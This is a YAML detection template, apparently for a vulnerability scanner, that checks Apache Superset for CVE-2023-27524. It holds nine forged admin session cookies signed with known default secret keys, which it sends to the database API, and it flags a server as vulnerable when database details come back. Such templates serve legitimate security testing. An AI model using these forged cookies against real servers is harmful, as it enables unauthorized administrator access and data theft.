name: yaml-poc-apache-superset-other-CVE-2023-27524
binding: aa0cc6c1-e6f4-4aba-b9e5-8183f6c5d642
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/172522/Apache-Superset-2.0.0-Authentication-Bypass.html
        - http://www.openwall.com/lists/oss-security/2023/04/24/2
        - https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk
        - https://nvd.nist.gov/vuln/detail/CVE-2023-27524
    vulnerability:
        id: 972bfda9-e8de-426d-82e7-901910e57748
        level: critical
    warning: Harmless
transport: http
payloads:
    payloads:
        sess1:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.RoFeMf1WLNJXDYslf18x9VGxC0Q"
        sess2:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hKV8XXVcD6lWhTIoWs0CjrSRPQQ"
        sess3:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.xtJXBhmJ0k6_oKs8iGhWJK2BjKs"
        sess4:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hRZP41FgqxjaxjJ3WyeIVxyZDng"
        sess5:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.6GpaUB9IP9OnG3HHon3XcdzHWhI"
        sess6:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEfQPg.Enz83rUqMAFfdCds7ClQzlEmScg"
        sess7:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEkLcQ.ITK9zUEwMLGmk1KvjJBWzZG74aU"
        sess8:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEkLZQ.agyIZJ1WpgUzj0_SBqQnZtRrX14"
        sess9:
            cookie: |
                "eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEkLVQ.h43GQFM40wkmEl469I8Ws3ABysw"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/v1/database/1
            headers:
                Cookie: session={{cookie}}
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"{\"description_columns\":{},") && response.body.bcontains(b"\"database_name\"")
expression: r0()
